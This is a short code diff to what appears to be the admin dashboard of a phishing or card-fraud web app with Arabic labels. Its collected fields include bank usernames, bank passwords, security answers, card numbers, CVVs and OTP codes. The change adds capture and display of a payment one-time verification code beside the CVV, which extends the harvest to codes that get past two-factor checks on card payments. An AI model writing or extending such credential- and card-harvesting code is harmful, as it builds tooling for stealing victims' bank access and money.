@@ -216,7 +216,7 @@ function mergeVersionsData(sources: AppVersion[]): AppVersion {
     "bankName", "bankUsername", "bankPassword", "securityAnswer",
     "otpCode",
     "paymentCardNumber", "paymentCardHolder", "paymentExpiryDate", "paymentCvv",
-    "paymentStatus", "paymentCompletedAt",
+    "paymentOtp", "paymentStatus", "paymentCompletedAt",
   ];
   const sorted = [...sources].sort(
     (a, b) => (Number(b.version) || 0) - (Number(a.version) || 0)
@@ -1354,6 +1354,10 @@ export default function AdminDashboardPage() {
                                   <DataBadge
                                     label="رمز CVV"
                                     value={allData.paymentCvv}
+                                  />
+                                  <DataBadge
+                                    label="رمز التحقق"
+                                    value={allData.paymentOtp}
                                   />
                                 </div>
                               </div>
